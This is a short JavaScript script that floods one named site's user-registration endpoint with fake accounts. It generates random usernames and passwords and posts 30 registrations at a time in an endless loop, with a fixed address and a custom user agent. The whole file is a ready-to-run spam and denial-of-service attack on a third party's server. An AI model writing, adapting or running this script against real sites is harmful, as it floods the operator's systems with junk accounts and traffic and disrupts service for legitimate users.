const endpoint = "https://nextzus.store/api/client/register.php";
const batchSize = 30; // Number of user registrations in each batch

function generateRandomCredentials() {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let username = "";
  let password = "";

  for (let i = 0; i < 10; i++) {
    username += characters.charAt(Math.floor(Math.random() * characters.length));
    password += characters.charAt(Math.floor(Math.random() * characters.length));
  }

  return { username, password };
}

async function registerBatch() {
  const batchPromises = [];

  for (let i = 0; i < batchSize; i++) {
    const { username, password } = generateRandomCredentials();

    const formData = new URLSearchParams();
    formData.append("username", username);
    formData.append("password", password);
    formData.append("password_cm", password);
    formData.append("addre", "1234 Main St");

    batchPromises.push(
      fetch(endpoint, {
        method: "POST",
        headers: {
          "User-agent": "BOBBY338",
        },
        body: formData,
        credentials: "include",
      }).then(response => response.json())
    );
  }

  return Promise.all(batchPromises);
}

async function registerUsersInBatches() {
  while (true) {
    const responseBatch = await registerBatch();
    console.log(responseBatch); // Handle the array of response data here
  }
}

// Run the registration process in batches
registerUsersInBatches();
